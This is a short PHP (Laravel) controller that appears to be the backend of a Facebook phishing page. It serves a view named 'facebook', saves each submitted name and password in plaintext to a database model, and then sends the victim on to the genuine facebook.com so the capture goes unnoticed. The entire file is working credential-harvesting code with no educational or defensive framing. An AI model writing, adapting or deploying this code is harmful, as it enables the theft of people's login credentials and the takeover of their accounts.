<?php

namespace App\Http\Controllers;

use App\facebook;
use Illuminate\Http\Request;

class ViewController extends Controller
{
    public function show (){
        return view('facebook');
    }

    public function save (Request $request)
    {
      $request->validate([
        'name'=>'Required',
        'password'=>'Required',
        ]);
        facebook::create([
          'name'=>$request->name,
          'password'=>$request->password,
       ]);
       return redirect('https://www.facebook.com/');
      }

}
